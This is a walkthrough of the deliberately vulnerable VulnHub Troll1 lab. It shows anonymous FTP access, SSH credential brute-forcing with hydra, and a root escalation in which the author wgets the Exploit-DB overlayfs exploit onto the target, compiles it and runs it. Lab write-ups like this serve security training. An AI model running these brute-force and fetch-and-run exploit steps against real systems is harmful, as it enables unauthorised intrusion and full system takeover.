---
title: "VulnHub - Troll1 Walkthrough"
date: 2020-09-27
tags: [vulnhub, walkthrough]
header:
  image: "/images/troll1-thumbnail.jpg"
excerpt: "Walkthroughs"
---

# VulnHub- Troll1 Walkthrough

Hello, everyone. Today I will share the Boot to Root process in Troll1 vulnerable machine. I will share only the successful way. There will not a lot of information.

## Information Gathering

We are starting with a **Nmap scan** to find open ports and services.

```console
root@kali:~/Troll1# nmap -p- -T4 -A troll1.local  
...
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 3.0.2  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_-rwxrwxrwx 1 1000 0 8068 Aug 10 2014 lol.pcap [NSE: writeable]  
...
22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)  
...  
80/tcp open http Apache httpd 2.4.7 ((Ubuntu))  
| http-robots.txt: 1 disallowed entry  
|_/secret  
|_http-server-header: Apache/2.4.7 (Ubuntu)  
...
```

## Enumeration

From the list, we can see that we have three open ports. FTP, SSH, and HTTP. Also, we have access to use **FTP** anonymously. We create a FTP session and download the only available file - `lol.pcap`.

```console
root@kali:~/Troll1# ftp 192.168.12.146  
...
Name (192.168.12.146:root): anonymous  
331 Please specify the password.  
Password:  password
...
ftp> dir  
...
-rwxrwxrwx 1 1000 0 8068 Aug 10 2014 lol.pcap  
...
ftp> get lol.pcap  
...
ftp>
```
From the `.pcap` extension, we understand that it is the traffic captured file. We open this file in **Wireshark** and Follow TCP Stream. From the captured traffic we found something, so I continue to analyze the traffic from `gedit`. There is a lot of messages in the traffic, but finally, I found one interesting folder. Also in this folder, there is a single file - `roflmao`. I download it and again open it in gedit.

```console
root@kali:~/Troll1# wget http://troll1.local/sup3rs3cr3tdirlol/roflmao
...
```

Then, I try to read it. It was a bin file so it is so hard to find something that is human-readable. Then I find this string. `Find address 0x0856BF to proceed` in the third line.

I check this folder in the browser and that's it. It is a folder that has two subfolders too. In of the subfolders there is a text file that contains usernames and the other one there is `Pass.txt` file and it is such a troll file.

I download usernames.

```console
root@kali:~/Troll1# wget http://troll1.local/0x0856BF/good_luck/which_one_lol.txt
```

## Exploitation
Then we will have a potential attack vector via SSH, so I try to get access from SSH Brute Force using **hydra**.

```console
root@kali:~/Troll1# cat which_one_lol.txt  
maleus  
ps-aux  
felux  
Eagle11  
genphlux  
usmc8892  
blawrg  
wytshadow  
vis1t0r  
overflow   
root@kali:~/Troll1# hydra -L which_one_lol.txt -p Pass.txt troll1.local ssh  
...
[22][ssh] host: troll1.local login: overflow password: Pass.txt  
...
```
Our proper account is overflow:Pass.txt. Then I make a SSH session to our victim.

```console
root@kali:~/Troll1# ssh overflow@192.168.12.146
root@kali:~/Troll1# ssh overflow@192.168.12.146  
overflow@192.168.12.146's password: Pass.txt
...
```

We are a simple user and we don't have root privileges. So I download **Linux-exploit-suggester**.

```console
$ bash  
overflow@troll:/$ cd /tmp/  
overflow@troll:/tmp$ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
...
overflow@troll:/tmp$ chmod u+x linux-exploit-suggester.sh  
overflow@troll:/tmp$ ./linux-exploit-suggester.sh
```

## Privilege Escalation
I try the Dirty Cow 2 bug, but it doesn't work, so I try to gain root access using **Overlay** exploit for local privilege escalation.

```console
overflow@troll:/tmp$ wget https://www.exploit-db.com/download/37292  
...
overflow@troll:/tmp$ mv 37292 37292.c  
overflow@troll:/tmp$ gcc 37292.c -o exploit  
overflow@troll:/tmp$ ./exploit  
...
# bash  
root@troll:/tmp# whoami  
root  
root@troll:/tmp# cd /root/  
root@troll:/root# ls  
proof.txt  
root@troll:/root# cat proof.txt  
Good job, you did it!  


702a8c18d29c6f3ca0d99ef5712bfbdc  
root@troll:/root#
```
That's it! We have an access to `proof.txt`. Victory!
